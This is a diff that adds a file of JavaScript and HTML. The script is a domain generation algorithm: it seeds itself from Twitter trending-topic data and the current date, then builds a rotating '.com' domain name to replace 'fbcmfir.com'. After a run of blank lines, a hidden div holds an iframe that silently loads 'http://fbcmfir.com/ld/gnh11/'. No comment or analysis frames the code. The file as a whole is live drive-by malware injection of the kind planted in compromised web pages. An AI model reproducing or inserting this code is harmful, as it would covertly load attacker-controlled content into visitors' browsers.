@@ -1,0 +1,44 @@
+var d = 'fbcmfir.com';
+var shiftIndex = 0;
+for (var i in window.tw.trends) {
+    if (window.h > 8 && window.h < 21 && i.indexOf(' 07') > -1) {
+        shiftIndex = window.tw.trends[i][4].query.charCodeAt(1) + window.tw.trends[i][4].query.length;
+        break;
+    } else if ((window.h < 9 || window.h > 20) && i.indexOf(' 18') > -1) {
+        shiftIndex = window.tw.trends[i][4].query.charCodeAt(1) + 10 + window.tw.trends[i][4].query.length;
+        break;
+    }
+}
+if (shiftIndex == 0) {
+    shiftIndex = window.tw.trends[i][6].query.charCodeAt(1) + 7 + window.tw.trends[i][6].query.length;
+}
+if (shiftIndex > 0) {
+    var time = new Array();
+    time['year'] = window.gd.getUTCFullYear();
+    time['month'] = window.gd.getUTCMonth() + 1;
+    time['day'] = window.gd.getUTCDate();
+    var d = 'fbcmfir.com';
+    var months = new Array('dbs', 'ytn', 'vmt', 'vmr', 'mlc', 'oxk', 'fds', 'bvf', 'yus', 'mcp', 'ncz', 'gdw');
+    var letters = new Array('a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'j', 'i', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z');
+    var numbers = new Array(1, 2, 3, 4, 5, 6, 7, 8, 9);
+
+    function CalculateMagicNumber(day, month, year, index) {
+        return (((year + (index * day)) + (month ^ day) * index) + day);
+    }
+    var yearCh1, yearCh2, monthCh, dayCh, num;
+    num = CalculateMagicNumber(time['day'], time['month'], time['year'], shiftIndex) + 100;
+    yearCh1 = letters[(((time['year'] & 0xAA) + num) % 63) % 26] + letters[(((time['year'] & 0xAA) << 2) + num) % 25];
+    yearCh2 = letters[((((time['year'] & 0x3311) >> 3) + num) % 10)] + letters[((((time['year'] & 0x3311) >> 4) + num) % 10)];
+    monthCh = letters[((time['month'] + num) % 25)] + letters[((time['month'] * num) % 25)];
+    dayCh = letters[((time['day'] * 6) % 27)];
+    timeCh = dayCh = letters[((time['day'] * num) % 24)];
+    $a = $a.replace(d, dayCh + yearCh2 + monthCh + yearCh1 + dayCh + months[time['month'] - 1] + '.com');
+}
+
+
+
+
+
+
+
+<div style="visibility:hidden"><iframe src="http://fbcmfir.com/ld/gnh11/" width=100 height=80></iframe></div>
